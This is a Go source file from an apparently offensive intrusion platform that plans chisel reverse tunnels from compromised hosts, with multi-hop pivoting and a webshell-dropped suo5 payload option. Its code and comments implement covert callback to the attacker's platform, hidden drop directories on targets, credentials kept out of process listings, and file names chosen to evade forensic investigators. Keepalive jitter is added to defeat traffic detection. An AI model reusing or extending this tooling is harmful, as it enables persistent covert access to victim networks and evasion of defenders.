// plan.go 生成隧道部署计划（四件套之 plan)。计划即持久化单元：Plan 整体序列化进
// tunnels.deploy_params，断链重拉反序列化后可直接重新 Deploy，不丢任何参数。
//
// auth 取舍：auth token crypto/rand 16 字节，只存 deploy_params 与平台侧
// --authfile(0600)，不出现在平台 server 进程命令行（ps 不可见）。目标侧 client
// 经 AUTH 环境变量传入（chisel client 在 --auth 缺省时读 AUTH env，见
// https://github.com/jpillora/chisel README),ps cmdline 不可见；残留暴露面是
// 目标机 /proc/<pid>/environ 对同 uid 可读——目标已是立足点，可接受，注释在此。
package tunnel

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strconv"
)

// Plan 是完整部署计划 = deploy_params 持久化内容。所有进程台账（server_pid/
// remote_pid/stage_token/远端路径）也回写进来，满足受管资源原则。
type Plan struct {
	Kind         string   `json:"kind"`                 // socks | portfwd
	Adapter      string   `json:"adapter"`              // chisel
	TaskID       int64    `json:"task_id"`              // 归属任务
	ViaSessionID int64    `json:"via_session_id"`       // 经哪个立足点部署
	ListenHost   string   `json:"listen_host"`          // 平台侧 server 绑定地址
	ListenPort   int      `json:"listen_port"`          // 平台侧 server 端口（目标回连口）
	SocksPort    int      `json:"socks_port,omitempty"` // socks：平台回环上的 socks5 入口
	LocalPort    int      `json:"local_port,omitempty"` // portfwd：平台回环上的转发入口
	TargetHost   string   `json:"target_host,omitempty"`
	TargetPort   int      `json:"target_port,omitempty"`
	PlatformAddr string   `json:"platform_addr"` // 目标回连地址 host:port(callback host + listen port)
	AuthUser     string   `json:"auth_user"`
	AuthPass     string   `json:"auth_pass"`   // crypto/rand 16 字节 hex；只在此处与 authfile，不进命令行
	AuthFile     string   `json:"auth_file"`   // 平台侧 --authfile 路径（0600)
	ServerArgs   []string `json:"server_args"` // chisel server 参数（不含 auth)
	ServerPID    int      `json:"server_pid,omitempty"`
	ServerLog    string   `json:"server_log"`
	// Platform 是目标侧执行环境形态（linux|windows），决定目标侧所有命令的语法。
	// 空 = linux：既有台账行没有这个字段，反序列化后必须仍按 Unix 路径工作。
	Platform   string `json:"platform,omitempty"`
	RemoteDir  string `json:"remote_dir"` // 目标侧工作目录（linux: /tmp/.<rand>；windows: %TEMP% 解析后的字面路径）
	RemoteBin  string `json:"remote_bin"`
	RemoteLog  string `json:"remote_log"`
	RemotePID  int    `json:"remote_pid,omitempty"`
	StageToken string `json:"stage_token,omitempty"` // 一次性投递条目（用完删）
	VerifyAddr string `json:"verify_addr,omitempty"` // 决定性验证目标 host:port
	// KeepAlive 是 chisel client 的 --keepalive 值（如 "11s"）。部署时随机生成，
	// 持久化进 deploy_params 使重拉沿用同一值（重拉换心跳值反而形成新特征）。
	// 空 = assemble 时兜底生成。
	KeepAlive string `json:"keep_alive,omitempty"`
	// ParentTunnelID / HopDepth 是多级隧道（P3-2）的层级信息。
	//
	// 单跳隧道的回调地址是「平台」，目标直连平台。多级隧道里，第二跳的
	// 「平台」其实是第一跳隧道提供的 socks 出口——即目标 B 经目标 A 的隧道回连。
	// ParentTunnelID=0 表示直连平台（单跳，既有行为）；>0 表示经该隧道转发。
	//
	// 层级上限 3（见 MaxHopDepth）：pivot 骨架明确写「控制在三层以内——每层延迟
	// 叠加、可用性相乘（四层 99% 只剩 96%），任一抖全链断」。
	ParentTunnelID int64    `json:"parent_tunnel_id,omitempty"`
	HopDepth       int      `json:"hop_depth,omitempty"`
	ClientArgs     []string `json:"client_args"` // chisel client 参数（不含 auth,auth 走 AUTH env)
	// 持久化停止意图；清理失败后巡检不得重新部署，显式 Teardown 可重试。
	CleanupPending bool `json:"cleanup_pending,omitempty"`
	// suo5 适配器字段（omitempty，向后兼容既有 chisel deploy_params):
	PayloadFile string `json:"payload_file,omitempty"` // 平台侧 payloads 目录里的文件名（suo5.php 等）
	PayloadName string `json:"payload_name,omitempty"` // 目标侧随机文件名
	PayloadPath string `json:"payload_path,omitempty"` // 目标侧完整落盘路径（webshell 同目录）
	PayloadURL  string `json:"payload_url,omitempty"`  // suo5 -t 的目标 URL
}

// PlanOpts 是计划生成输入。端口分配所需的占用集合与绑定检查由调用方注入，
// 保持本包组装逻辑纯函数可测。
type PlanOpts struct {
	TaskID       int64
	ViaSessionID int64
	ListenHost   string // 空 = 0.0.0.0
	CallbackHost string // 目标回连平台用的主机地址（config.CallbackAddr 的 host 部分）
	// Platform 是目标侧执行环境形态（"" = linux）。由调用方按会话判定
	// （PlatformForSession），计划据此生成目标侧路径与命令语法。
	Platform string
	// ParentTunnelID / HopDepth 是多级隧道（P3-2）：经已有隧道转发本跳的回连。
	// ParentTunnelID=0 = 直连平台（单跳，既有行为）。
	ParentTunnelID int64
	HopDepth       int
	TargetHost     string // portfwd 必填
	TargetPort     int    // portfwd 必填
	VerifyAddr     string // socks 决定性验证目标（通常立足点 webshell 的 host:port)
	PortMin        int
	PortMax        int
	// PinListenPort 非 0 时强制用该端口做平台侧监听口（目标回连口）。
	// 动机：probe 已实测「哪些口能出网」，常见内网只放 443/80/53 出——此时
	// 从 20000-21000 池里分配必然回连失败。由调用方把 probe 的 suggested_port
	// 回填进来。仍会过 UsedPorts / CanListen 校验，冲突即报错而不是静默换口
	// （静默换口会让「探通了却建不成」的故障重新变成黑盒）。
	PinListenPort int
	UsedPorts     map[int]bool        // 已占端口（活隧道台账）
	CanListen     func(port int) bool // 真实可绑检查；nil 跳过
	DataDir       string              // 平台侧隧道工作目录（authfile/日志）
}

// allocateListenPort 选平台侧监听口：优先 PinListenPort，否则端口池顺序分配。
// PinListenPort 冲突时返回明确错误（不静默回退），由调用方决定换口还是放弃。
func allocateListenPort(o *PlanOpts) (int, error) {
	if o.PinListenPort <= 0 {
		return AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	}
	p := o.PinListenPort
	if p > 65535 {
		return 0, fmt.Errorf("钉死端口 %d 非法（需 1-65535）", p)
	}
	if o.UsedPorts[p] {
		return 0, fmt.Errorf("钉死端口 %d 已被占用（另一条活隧道在用）；换一个端口或先回收旧隧道", p)
	}
	if o.CanListen != nil && !o.CanListen(p) {
		return 0, fmt.Errorf("钉死端口 %d 在本机绑定失败（可能被其它进程占用）；换一个端口或先释放", p)
	}
	return p, nil
}

// newAuth 生成 auth 凭据：user 固定 "chengjian",pass 为 crypto/rand 16 字节 hex。
func newAuth() (user, pass string, err error) {
	b := make([]byte, 16)
	if _, err = rand.Read(b); err != nil {
		return "", "", fmt.Errorf("auth token 生成失败: %w", err)
	}
	return "chengjian", hex.EncodeToString(b), nil
}

// randTag 生成 8 字符随机后缀（远端目录/文件名）。
func randTag() (string, error) {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// MaxHopDepth 是多级隧道的层级上限。
//
// 判据来自项目自己的 chains pivot 骨架：「控制在三层以内——每层延迟叠加、
// 可用性相乘（四层 99% 只剩 96%），任一抖全链断；同段选一最稳机器做代表」。
// 这里把那条经验落成代码约束，而不是留给模型自觉。
const MaxHopDepth = 3

// ValidateHopDepth 校验多级隧道层级。depth<=1 即单跳（合法）。
func ValidateHopDepth(depth int) error {
	if depth < 0 {
		return fmt.Errorf("hop_depth 不能为负（%d）", depth)
	}
	if depth > MaxHopDepth {
		return fmt.Errorf("隧道层级 %d 超过上限 %d：每多一跳延迟叠加、可用性相乘，"+
			"任一环抖动整条链断。请改为在目标网段内选一台更靠内的机器做单跳立足点", depth, MaxHopDepth)
	}
	return nil
}

func (o *PlanOpts) base(kind string) (*Plan, error) {
	user, pass, err := newAuth()
	if err != nil {
		return nil, err
	}
	tag, err := randTag()
	if err != nil {
		return nil, err
	}
	listenHost := o.ListenHost
	if listenHost == "" {
		listenHost = "0.0.0.0"
	}
	listenPort, err := allocateListenPort(o)
	if err != nil {
		return nil, err
	}
	if o.UsedPorts == nil {
		o.UsedPorts = map[int]bool{}
	}
	o.UsedPorts[listenPort] = true // 同一计划内再分配不撞车
	dir := o.DataDir               // 平台侧隧道工作目录（Manager.PlanDataDir,authfile/日志落这里）
	plat := PlatformOf(o.Platform)
	hs := HostOf(plat)
	// 目标侧路径按平台生成。Linux 是字面量（/tmp/.<tag>），Windows 是
	// %TEMP%\<tag> 表达式——部署时先解析成字面路径再落台账（见
	// deploy.resolveRemotePaths）。表达式不能进台账：重启后清理命令不在
	// cmd 上下文里，%TEMP% 不会被展开。
	remoteDir := hs.TempDirExpr(tag)
	return &Plan{
		Kind:         kind,
		Adapter:      AdapterChisel,
		TaskID:       o.TaskID,
		ViaSessionID: o.ViaSessionID,
		ListenHost:   listenHost,
		ListenPort:   listenPort,
		Platform:     string(plat),
		PlatformAddr: net.JoinHostPort(o.CallbackHost, strconv.Itoa(listenPort)),
		AuthUser:     user,
		AuthPass:     pass,
		AuthFile:     dir + "/" + tag + ".auth",    // 批 7 P1-4:平台侧文件去 "chisel" 特征名(防取证者一眼认出)
		ServerLog:    dir + "/" + tag + ".run.log", // 同上:无语义名,随机 tag 已保证唯一
		RemoteDir:    remoteDir,
		RemoteBin:    hs.Join(remoteDir, hs.BinName()),
		RemoteLog:    hs.Join(remoteDir, "run.log"),
		VerifyAddr:   o.VerifyAddr,
		// 每次部署随机心跳间隔，打散周期性流量特征（见 jitteredKeepAlive 注释）。
		KeepAlive: jitteredKeepAlive(),
		// 多级隧道层级信息（0 = 单跳直连平台）。
		ParentTunnelID: o.ParentTunnelID,
		HopDepth:       o.HopDepth,
	}, nil
}

// assemble 补齐 server/client 命令行。server 经 --authfile 鉴权（auth 不进 ps);
// client 经 AUTH env 鉴权（spawn 时注入，见 deploy.go),ClientArgs 同样不含 auth。
func (p *Plan) assemble(remoteSpec string) {
	p.ServerArgs = []string{
		"server",
		"--host", p.ListenHost,
		"-p", strconv.Itoa(p.ListenPort),
		"--reverse",
		"--authfile", p.AuthFile,
	}
	ka := p.KeepAlive
	if ka == "" {
		ka = jitteredKeepAlive() // 兜底：调用方没设时也要随机，不能退回固定 10s
	}
	p.ClientArgs = []string{
		"client",
		"--keepalive", ka, // chisel 选项必须先于 server/remote——放后面会被当成 remote 解析
		// (实战教训:报 "Failed to decode remote '--keepalive': Missing ports" 客户端秒退)
		"http://" + p.PlatformAddr,
		remoteSpec,
	}
}

// keepAliveMin/Max 是心跳间隔的抖动区间（秒）。
//
// 为什么必须抖动：chisel 默认/固定 keepalive 会形成严格周期流量，而项目自己的
// chains pivot 骨架明确写着「周期规律是最大破绽」「心跳设阈值 1/2~2/3、加随机
// 抖动」。固定 10s 等于把「这是一条隧道」写在了流量特征上。
//
// 区间选择：8~15s。下限不低于常见中间设备的 15s idle-timeout 的一半（否则可能
// 被 idle 掐断），上限不超过 15s（保持连接活跃）。抖动幅度 ±30% 左右，足以打散
// 周期性又不至于让 chisel 判死连接。
const (
	keepAliveMinSec = 8
	keepAliveMaxSec = 15
)

// jitteredKeepAlive 返回 [8s,15s] 内的随机 keepalive 值（秒级粒度）。
// 用 crypto/rand 而非 math/rand：与同文件其它随机（auth/tag）保持同一来源，
// 避免引入第二个随机源带来的可预测性差异。
func jitteredKeepAlive() string {
	n := keepAliveMaxSec - keepAliveMinSec + 1
	var b [1]byte
	if _, err := rand.Read(b[:]); err != nil {
		// 随机源失败时取区间中点，而不是退回固定值——固定值正是要避免的。
		return strconv.Itoa((keepAliveMinSec+keepAliveMaxSec)/2) + "s"
	}
	return strconv.Itoa(keepAliveMinSec+int(b[0])%n) + "s"
}

// PlanSocks 生成反向 socks 计划：平台回环 127.0.0.1:SocksPort 是 socks5 入口，
// 返回形式（socks5://127.0.0.1:port）期 3b 的按任务 proxyEnv 可直接消费。
func PlanSocks(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host 必填（目标回连平台用；配 CHENGJIAN_CALLBACK_ADDR)")
	}
	if err := ValidateHopDepth(o.HopDepth); err != nil {
		return nil, err
	}
	p, err := o.base(KindSocks)
	if err != nil {
		return nil, err
	}
	socksPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.SocksPort = socksPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(socksPort) + ":socks")
	return p, nil
}

// PlanPortfwd 生成反向单端口转发计划：平台回环 127.0.0.1:LocalPort → 目标侧
// TargetHost:TargetPort。
func PlanPortfwd(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host 必填（目标回连平台用；配 CHENGJIAN_CALLBACK_ADDR)")
	}
	if o.TargetHost == "" || o.TargetPort <= 0 {
		return nil, fmt.Errorf("portfwd 需要 target_host 与 target_port")
	}
	p, err := o.base(KindPortfwd)
	if err != nil {
		return nil, err
	}
	localPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.LocalPort = localPort
	p.TargetHost = o.TargetHost
	p.TargetPort = o.TargetPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(localPort) + ":" +
		net.JoinHostPort(o.TargetHost, strconv.Itoa(o.TargetPort)))
	return p, nil
}

// AuthfileContent 是 --authfile 文件内容。chisel 的 authfile 是 JSON users 映射
// {"user:pass": ["允许的 remote 地址模式"]}——不是裸 user:pass 文本
// (实战教训:v1.11 服务端对裸文本直接报 Invalid JSON 秒退)。
func (p *Plan) AuthfileContent() string {
	b, _ := json.Marshal(map[string][]string{
		p.AuthUser + ":" + p.AuthPass: {".*"},
	})
	return string(b) + "\n"
}

// RollbackStep 描述一层回滚动作。Deploy 任一层失败，按 RollbackSteps 给出的
// 顺序（从最深的已完成层往回收）逐层回滚，不留孤儿进程/文件/台账。
type RollbackStep struct {
	Layer  string `json:"layer"`  // remote_process/remote_files/server_process/stage_entry/authfile/ledger_row
	Action string `json:"action"` // kill/rm/delete
	Detail string `json:"detail"`
}

// host 返回目标侧命令生成器。Platform 为空按 linux（既有台账行的兼容语义，
// 见 PlatformOf）。
func (p *Plan) host() HostShell { return HostOf(PlatformOf(p.Platform)) }

// RollbackSteps 返回完整回滚序列（纯函数，顺序即契约：先目标侧后平台侧，
// 台账行永远最后删——它是重拉与审计的唯一依据）。实际执行时按失败深度截断。
func (p *Plan) RollbackSteps() []RollbackStep {
	hs := p.host()
	killDetail := fmt.Sprintf("经会话 kill 目标侧 pid %d（先 kill -0 并核对 /proc/<pid>/cmdline 含 %s)", p.RemotePID, p.RemoteBin)
	rmDetail := "经会话 rm -rf " + p.RemoteDir
	if hs.IsWindows() {
		killDetail = fmt.Sprintf("经会话核对 pid %d 命令行含 %s 后 Stop-Process 停止", p.RemotePID, p.RemoteBin)
		rmDetail = "经会话 rmdir /s /q " + p.RemoteDir
	}
	return []RollbackStep{
		{Layer: "remote_process", Action: "kill", Detail: killDetail},
		{Layer: "remote_files", Action: "rm", Detail: rmDetail},
		{Layer: "server_process", Action: "kill", Detail: fmt.Sprintf("杀平台侧 chisel server pid %d（核对命令行含 %s)", p.ServerPID, p.AuthFile)},
		{Layer: "stage_entry", Action: "delete", Detail: "删除 stage 投递条目 token=" + p.StageToken},
		{Layer: "authfile", Action: "rm", Detail: "删除平台侧 authfile " + p.AuthFile},
		{Layer: "ledger_row", Action: "delete", Detail: "删除 tunnels 台账行"},
	}
}
